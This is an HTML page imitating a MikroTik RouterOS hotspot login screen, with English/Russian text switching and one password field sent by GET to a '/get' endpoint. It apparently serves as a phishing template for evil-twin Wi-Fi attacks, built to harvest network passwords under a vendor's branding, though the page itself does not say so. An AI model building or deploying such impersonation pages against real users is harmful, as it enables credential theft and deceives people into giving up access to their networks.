<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RouterOS RouterBoard > Login</title>
    <style>
        body {
            color: #333;
            font-family: "Segoe UI", "Tahoma", sans-serif;
            font-size: 14px;
            margin: 0;
            padding: 0;
            background-color: #EEEEEE;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .container {
            width: 320px;
            background-color: #FFFFFF;
            border: 1px solid #999999;
            box-shadow: 2px 2px 10px rgba(0,0,0,0.1);
        }

        .header {
            background: linear-gradient(to bottom, #FFFFFF 0%, #E5E5E5 100%);
            padding: 10px 15px;
            border-bottom: 1px solid #BBBBBB;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 14px;
            margin: 0;
            color: #444;
            font-weight: bold;
        }

        .lang-switch {
            font-size: 11px;
        }

        .lang-switch a {
            color: #4A90E2;
            text-decoration: none;
            cursor: pointer;
            font-weight: bold;
        }

        .lang-switch a:hover {
            text-decoration: underline;
        }

        .content {
            padding: 25px 20px;
        }

        .info-text {
            margin-bottom: 20px;
            color: #666;
            font-size: 13px;
            line-height: 1.4;
            height: 40px; 
        }

        .input-label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }

        input[type="password"] {
            width: 100%;
            padding: 6px 8px;
            border: 1px solid #AAAAAA;
            background-color: #FAFAFA;
            box-sizing: border-box;
            margin-bottom: 15px;
            outline: none;
        }

        .button-row {
            display: flex;
            justify-content: flex-end;
        }

        button {
            background: linear-gradient(to bottom, #F9F9F9 0%, #DCDCDC 100%);
            border: 1px solid #999999;
            color: #333;
            padding: 5px 20px;
            font-size: 13px;
            cursor: pointer;
            border-radius: 2px;
            min-width: 60px;
        }

        button:hover {
            border-color: #777777;
        }

        .footer {
            background-color: #F6F6F6;
            padding: 8px 15px;
            border-top: 1px solid #DDDDDD;
            font-size: 11px;
            color: #999;
            text-align: right;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1 id="title">MikroTik RouterOS</h1>
        <div class="lang-switch">
            <a onclick="setLang('en')">EN</a> | <a onclick="setLang('ru')">RU</a>
        </div>
    </div>

    <div class="content">
        <div id="info" class="info-text">
            Please log in to use the internet hotspot service.
        </div>

        <form id="submit-form" action="/get" method="GET">
            <label id="label-pass" class="input-label">Password:</label>
            <input type="password" id="pass-input" name="password" placeholder="Password" required autofocus>
            
            <div class="button-row">
                <button type="submit" id="btn-submit">OK</button>
            </div>
        </form>
    </div>

    <div class="footer">
        Powered by MikroTik RouterBoard
    </div>
</div>

<script>
    const langData = {
        en: {
            title: "MikroTik RouterOS",
            info: "Please log in to use the internet hotspot service.",
            label: "Password:",
            placeholder: "Password",
            btn: "OK"
        },
        ru: {
            title: "MikroTik RouterOS",
            info: "Для доступа к интернету необходимо пройти авторизацию.",
            label: "Пароль:",
            placeholder: "Введите пароль",
            btn: "Войти"
        }
    };

    function setLang(lang) {
        document.getElementById('info').innerText = langData[lang].info;
        document.getElementById('label-pass').innerText = langData[lang].label;
        document.getElementById('pass-input').placeholder = langData[lang].placeholder;
        document.getElementById('btn-submit').innerText = langData[lang].btn;
    }
</script>

</body>
</html>
